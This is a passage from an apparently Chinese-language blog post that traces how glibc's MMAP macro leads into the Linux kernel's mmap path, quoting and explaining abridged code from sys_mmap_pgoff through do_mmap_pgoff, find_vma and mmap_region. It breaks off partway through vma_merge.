(__glibc_unlikely(perturb_byte))<br>        <span class="hljs-built_in">memset</span>(p, perturb_byte ^ <span class="hljs-number">0xff</span>, n);<br>&#125;<br></code></pre></td></tr></table></figure><p>刚函数没有什么实际意义，所以不管它。</p><h2 id="MMAP"><a href="#MMAP" class="headerlink" title="MMAP"></a>MMAP</h2><p>为了方便分析，这里贴一段调用MMAP的代码，</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">mm</span> = (char *) (MMAP(<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>MMAP在glibc中为宏定义，其定义很长，这里简单将它改写，</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#define INTERNAL_SYSCALL_MAIN_6(name, err, arg1, arg2, arg3,        \</span><br>                arg4, arg5, arg6)           <span class="hljs-string">\</span><br>  struct libc_do_syscall_args _xv =                 <span class="hljs-string">\</span><br>    &#123;                                   <span class="hljs-string">\</span><br>      (int) (<span class="hljs-number">0</span>),                            <span class="hljs-string">\</span><br>      (int) (-<span class="hljs-number">1</span>),                           <span class="hljs-string">\</span><br>      (int) (<span class="hljs-number">0</span>)                         <span class="hljs-string">\</span><br>    &#125;;                                  <span class="hljs-string">\</span><br>    asm volatile (                          <span class="hljs-string">\</span><br>    <span class="hljs-string">&quot;movl %1, %%eax\n\t&quot;</span>                        <span class="hljs-string">\</span><br>    <span class="hljs-string">&quot;call __libc_do_syscall&quot;</span>                        <span class="hljs-string">\</span><br>    : <span class="hljs-string">&quot;=a&quot;</span> (resultvar)                          <span class="hljs-string">\</span><br>    : <span class="hljs-string">&quot;i&quot;</span> (__NR_mmap2), <span class="hljs-string">&quot;c&quot;</span> (size), <span class="hljs-string">&quot;d&quot;</span> (PROT_READ | PROT_WRITE), <span class="hljs-string">&quot;S&quot;</span> (MAP_ANONYMOUS|MAP_PRIVATE), <span class="hljs-string">&quot;D&quot;</span> (&amp;_xv) <span class="hljs-string">\</span><br>    : <span class="hljs-string">&quot;memory&quot;</span>, <span class="hljs-string">&quot;cc&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>__libc_do_syscall</code>是一段汇编代码，最后就是系统调用啦，这里就进入了linux内核中的代码，在arch&#x2F;x86&#x2F;entry&#x2F;syscalls&#x2F;syscall_32.tbl中有如下定义，</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">192 </span>i386    mmap2           sys_mmap_pgoff<br></code></pre></td></tr></table></figure><p>因此，MMAP最后调用linux内核中的<code>sys_mmap_pgoff</code>函数，定义在mm&#x2F;mmap.c中，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">SYSCALL_DEFINE6</span>(mmap_pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, len,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, prot, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, flags,<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, pgoff)&#123;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file</span> *file = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> retval = -EBADF;<br><br>    <span class="hljs-keyword">if</span> (!(flags &amp; MAP_ANONYMOUS)) &#123;<br><br>        ...<br><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (flags &amp; MAP_HUGETLB) &#123;<br><br>        ...<br><br>    &#125;<br><br>    flags &amp;= ~(MAP_EXECUTABLE | MAP_DENYWRITE);<br><br>    retval = <span class="hljs-built_in">vm_mmap_pgoff</span>(file, addr, len, prot, flags, pgoff);<br>    <span class="hljs-keyword">return</span> retval;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SYSCALL_DEFINE6</code>是个宏定义，就是将系统调用号和函数联系起来，这里其实就是定义了<code>sys_mmap_pgoff</code>函数。根据前面传入的flags，这里直接跳过判断，因此下面主要就是执行<code>vm_mmap_pgoff</code>函数，定义在mm&#x2F;utils.c中，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title">vm_mmap_pgoff</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> prot,</span></span><br><span class="hljs-params"><span class="hljs-function">    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flag, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pgoff)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ret;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">mm_struct</span> *mm = current-&gt;mm;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> populate;<br><br>    ret = <span class="hljs-built_in">security_mmap_file</span>(file, prot, flag);<br>    <span class="hljs-keyword">if</span> (!ret) &#123;<br>        <span class="hljs-built_in">down_write</span>(&amp;mm-&gt;mmap_sem);<br>        ret = <span class="hljs-built_in">do_mmap_pgoff</span>(file, addr, len, prot, flag, pgoff,<br>                    &amp;populate);<br>        <span class="hljs-built_in">up_write</span>(&amp;mm-&gt;mmap_sem);<br>        <span class="hljs-keyword">if</span> (populate)<br>            <span class="hljs-built_in">mm_populate</span>(ret, populate);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里首先获得进程的<code>mm_struct</code>结构，该结构保存了虚拟内存和物理内存的映射关系，<code>security_mmap_file</code>和linux安全有关，这里不关心，因此调用<code>do_mmap_pgoff</code>执行主要的mmap内容，前后加了信号量。<code>do_mmap_pgoff</code>定义在mm&#x2F;mmap.c中，这里省略了很多不关键的代码，</p><h2 id="do-mmap-pgoff"><a href="#do-mmap-pgoff" class="headerlink" title="do_mmap_pgoff"></a>do_mmap_pgoff</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title">do_mmap_pgoff</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> prot,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pgoff,</span></span><br><span class="hljs-params"><span class="hljs-function">            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *populate)</span></span>&#123;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">mm_struct</span> *mm = current-&gt;mm;<br>    <span class="hljs-type">vm_flags_t</span> vm_flags;<br>    *populate = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (!(flags &amp; MAP_FIXED))<br>        addr = <span class="hljs-built_in">round_hint_to_min</span>(addr);<br>    len = <span class="hljs-built_in">PAGE_ALIGN</span>(len);<br><br>    addr = <span class="hljs-built_in">get_unmapped_area</span>(file, addr, len, pgoff, flags);<br>    vm_flags = <span class="hljs-built_in">calc_vm_prot_bits</span>(prot) | <span class="hljs-built_in">calc_vm_flag_bits</span>(flags) |<br>            mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC;<br><br>    <span class="hljs-keyword">if</span> (file) &#123;<br><br>        ...<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">switch</span> (flags &amp; MAP_TYPE) &#123;<br>        <span class="hljs-keyword">case</span> MAP_SHARED:<br>            ...<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> MAP_PRIVATE:<br>            pgoff = addr &gt;&gt; PAGE_SHIFT;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> -EINVAL;<br>        &#125;<br>    &#125;<br><br>    addr = <span class="hljs-built_in">mmap_region</span>(file, addr, len, vm_flags, pgoff);<br>    <span class="hljs-keyword">return</span> addr;<br>&#125;<br></code></pre></td></tr></table></figure><p>传入的flags没有<code>MAP_FIXED</code>，表是映射的地址不固定（这里传入的<code>addr</code>为0），由内核分配。接下来通过调用<code>round_hint_to_min</code>和<code>PAGE_ALIGN</code>对地址和长度进行页对齐，并且检查地址是否溢出或者太小。<br>下面调用<code>get_unmapped_area</code>在进程的用户空间里查找已经分配的虚拟内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title">get_unmapped_area</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags)</span></span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-title">long</span> <span class="hljs-params">(*get_area)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)</span></span>;<br><br>    ...<br><br>    get_area = current-&gt;mm-&gt;get_unmapped_area;<br><br>    ...<br><br>    addr = <span class="hljs-built_in">get_area</span>(file, addr, len, pgoff, flags);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_VALUE</span>(addr))<br>        <span class="hljs-keyword">return</span> addr;<br><br>    ...<br><br>    <span class="hljs-keyword">return</span> addr;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里首先获取<code>get_area</code>函数指针用来查找用户空间中已经分配的虚拟内存，这里根据mmap的方向可以获取到<code>arch_get_unmapped_area_topdown</code>或者<code>arch_get_unmapped_area</code>两个函数指针，其<code>arch_get_unmapped_area_topdown</code>对应的mmap方向是从高地址往低地址方向扩展的，本章还是分析传统的从低地址往高地址拓展对应的<code>arch_get_unmapped_area</code>函数，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span></span><br><span class="hljs-function"><span class="hljs-title">arch_get_unmapped_area</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags)</span></span>&#123;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">mm_struct</span> *mm = current-&gt;mm;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">vm_area_struct</span> *vma;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">vm_unmapped_area_info</span> info;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> begin, end;<br><br>    <span class="hljs-keyword">if</span> (flags &amp; MAP_FIXED)<br>        <span class="hljs-keyword">return</span> addr;<br><br>    ...<br><br>    <span class="hljs-keyword">if</span> (addr) &#123;<br>        addr = <span class="hljs-built_in">PAGE_ALIGN</span>(addr);<br>        vma = <span class="hljs-built_in">find_vma</span>(mm, addr);<br>        <span class="hljs-keyword">if</span> (end - len &gt;= addr &amp;&amp;<br>            (!vma || addr + len &lt;= vma-&gt;vm_start))<br>            <span class="hljs-keyword">return</span> addr;<br>    &#125;<br><br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>首先，如果是固定地址映射，直接返回addr地址。本章分析的不是这种情况，省略的代码和一些随机映射有关，这里省略了不分析。这样就进入了底下的if语句里，对地址对齐后，就调用find_vma查找addr地址开始已经分配出去的虚拟内存vma，最后addr到addr+len这个地址范围内没有虚拟内存，就将地址返回。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">struct</span> vm_area_struct *find_vma(struct mm_struct *mm, unsigned long addr)<br>&#123;<br>    <span class="hljs-attribute">struct</span> rb_node *rb_node;<br>    <span class="hljs-attribute">struct</span> vm_area_struct *vma;<br><br>    <span class="hljs-attribute">vma</span> = vmacache_find(mm, addr);<br>    <span class="hljs-attribute">if</span> (likely(vma))<br>        return vma;<br><br>    <span class="hljs-attribute">rb_node</span> = mm-&gt;mm_rb.rb_node;<br>    <span class="hljs-attribute">vma</span> = NULL;<br><br>    <span class="hljs-attribute">while</span> (rb_node) &#123;<br>        <span class="hljs-attribute">struct</span> vm_area_struct *tmp;<br><br>        <span class="hljs-attribute">tmp</span> = rb_entry(rb_node, struct vm_area_struct, vm_rb);<br><br>        <span class="hljs-attribute">if</span> (tmp-&gt;vm_end &gt; addr) &#123;<br>            <span class="hljs-attribute">vma</span> = tmp;<br>            <span class="hljs-attribute">if</span> (tmp-&gt;vm_start &lt;= addr)<br>                <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">rb_node</span> = rb_node-&gt;rb_left;<br>        &#125; <span class="hljs-attribute">else</span><br>            rb_node = rb_node-&gt;rb_right;<br>    &#125;<br><br>    <span class="hljs-attribute">if</span> (vma)<br>        vmacache_update(addr, vma);<br>    <span class="hljs-attribute">return</span> vma;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就不往下继续看代码的，简单来说，进程已经分配的虚拟内存保存在一个红黑树中，红黑树简单的作用就是防止一个树结构不平衡，出现某个左子树严重大于右子树的情况。为了加快查找的速度，这里设立了缓存。通过观察while结构，这里就是查找第一个结束地址大于addr的已经分配的虚拟内存，然后返回。</p><p>回到<code>do_mmap_pgoff</code>中，<code>calc_vm_prot_bits</code>和<code>calc_vm_flag_bits</code>用来将prot和flags中的标志位转化为vm的标志位，例如prot中的<code>PROT_READ</code>转化为<code>VM_READ</code>，flags中的<code>MAP_GROWSDOWN</code>转化为<code>VM_GROWSDOWN</code>。根据前面prot和flags中的值，这里转化后，<code>vm_flags</code>为<code>VM_READ|VM_WRITE|mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC</code>。最后就调用mmap_region构造一个vma用来保存刚刚获得的虚拟内存。</p><h2 id="mmap-region"><a href="#mmap-region" class="headerlink" title="mmap_region"></a>mmap_region</h2><p>为了方便分析和查看，这里对mmap_region代码做了适当的删除和改写，</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> mmap_region(struct file *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr,<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> len, vm_flags_t vm_flags, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> pgoff)<br>&#123;<br>    struct mm_struct *mm = current-&gt;mm;<br>    struct vm_area_struct *vma, *prev;<br>    <span class="hljs-keyword">int</span> error;<br>    struct rb_node **rb_link, *rb_parent;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> charged = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (!may_expand_vm(mm, len &gt;&gt; PAGE_SHIFT)) &#123;<br><br>        ...<br><br>    &#125;<br><br>    error = -ENOMEM;<br>    <span class="hljs-keyword">while</span> (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link,<br>                  &amp;rb_parent)) &#123;<br>        <span class="hljs-keyword">if</span> (do_munmap(mm, addr, len))<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>    &#125;<br><br>    vm_flags |= VM_ACCOUNT;<br><br>    vma = vma_merge(mm, prev, addr, addr + len, vm_flags, NULL, file, pgoff,<br>            NULL);<br>    <span class="hljs-keyword">if</span> (vma)<br>        goto out;<br><br>    vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);<br>    vma-&gt;vm_mm = mm;<br>    vma-&gt;vm_start = addr;<br>    vma-&gt;vm_end = addr + len;<br>    vma-&gt;vm_flags = vm_flags;<br>    vma-&gt;vm_page_prot = vm_get_page_prot(vm_flags);<br>    vma-&gt;vm_pgoff = pgoff;<br>    INIT_LIST_HEAD(&amp;vma-&gt;anon_vma_chain);<br><br>    vma_link(mm, vma, prev, rb_link, rb_parent);<br>out:<br><br>    vm_stat_account(mm, vm_flags, file, len &gt;&gt; PAGE_SHIFT);<br>    <span class="hljs-keyword">if</span> (vm_flags &amp; VM_LOCKED) &#123;<br>        <span class="hljs-keyword">if</span> (!((vm_flags &amp; VM_SPECIAL) || is_vm_hugetlb_page(vma) ||<br>                    vma == get_gate_vma(current-&gt;mm)))<br>            mm-&gt;locked_vm += (len &gt;&gt; PAGE_SHIFT);<br>        <span class="hljs-keyword">else</span><br>            vma-&gt;vm_flags &amp;= ~VM_LOCKED;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (file)<br>        uprobe_mmap(vma);<br><br>    vma-&gt;vm_flags |= VM_SOFTDIRTY;<br><br>    vma_set_page_prot(vma);<br><br>    <span class="hljs-keyword">return</span> addr;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>may_expand_vm</code>用于判断加上即将分配的虚拟内存，是否超过了系统的限制，如果超过了就需要进行相应的操作或者返回错误，这里假设不会超过系统限制，不管它。<br><code>find_vma_links</code>的定义如下，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">find_vma_links</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end, <span class="hljs-keyword">struct</span> vm_area_struct **pprev,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">struct</span> rb_node ***rb_link, <span class="hljs-keyword">struct</span> rb_node **rb_parent)</span></span>&#123;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">rb_node</span> **__rb_link, *__rb_parent, *rb_prev;<br><br>    __rb_link = &amp;mm-&gt;mm_rb.rb_node;<br>    rb_prev = __rb_parent = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">while</span> (*__rb_link) &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">vm_area_struct</span> *vma_tmp;<br><br>        __rb_parent = *__rb_link;<br>        vma_tmp = <span class="hljs-built_in">rb_entry</span>(__rb_parent, <span class="hljs-keyword">struct</span> vm_area_struct, vm_rb);<br><br>        <span class="hljs-keyword">if</span> (vma_tmp-&gt;vm_end &gt; addr) &#123;<br>            <span class="hljs-keyword">if</span> (vma_tmp-&gt;vm_start &lt; end)<br>                <span class="hljs-keyword">return</span> -ENOMEM;<br>            __rb_link = &amp;__rb_parent-&gt;rb_left;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            rb_prev = __rb_parent;<br>            __rb_link = &amp;__rb_parent-&gt;rb_right;<br>        &#125;<br>    &#125;<br><br>    *pprev = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (rb_prev)<br>        *pprev = <span class="hljs-built_in">rb_entry</span>(rb_prev, <span class="hljs-keyword">struct</span> vm_area_struct, vm_rb);<br>    *rb_link = __rb_link;<br>    *rb_parent = __rb_parent;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数做了两件事，第一件事是重新检查一遍即将分配的虚拟内存是否已经被使用，主要是其他进程可能在这期间分配了该虚拟内存，第二件事是确定即将插入红黑树中的位置，保存在<code>prev</code>、<code>rb_link</code>和<code>rb_parent</code>中。<code>prev</code>保存了虚拟内存结束地址小于即将分配的虚拟内存开始地址的红黑树节点，<code>rb_link</code>一般为null，<code>rb_parent</code>简单说就是保存了离即将分配的虚拟内存开始地址最近的红黑树节点。</p><p>再往下通过vma_merge函数查看是否有虚拟空间可以合并，如果有则合并并返回。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs xl">struct vm_area_struct *vma_merge(struct mm_struct *mm,<br>            struct vm_area_struct *prev, unsigned long addr,<br>            unsigned long end, unsigned long vm_flags,<br>            struct anon_vma *anon_vma, struct file *file,<br>            pgoff_t pgoff, struct mempolicy *policy)&#123;<br><br>    pgoff_t pglen = (end - addr) &gt;&gt; PAGE_SHIFT;<br>    struct vm_area_struct *area, *next;<br>    int err;<br><br>    <span class="hljs-keyword">if</span> (vm_flags &amp; VM_SPECIAL)<br>        return NULL;<br><br>    <span class="hljs-keyword">if</span> (prev)<br>        <span class="hljs-function"><span class="hljs-title">next</span> = prev-&gt;</span>vm_next;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-function"><span class="hljs-title">next</span> = mm-&gt;</span>mmap;<br>    area = next;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (next &amp;&amp; next-&gt;</span>vm_end == end)<br>        <span class="hljs-function"><span class="hljs-title">next</span> = next-&gt;</span>vm_next;<br><br>    <span class="hljs-function"><span class="hljs-title">if</span> (prev &amp;&amp; 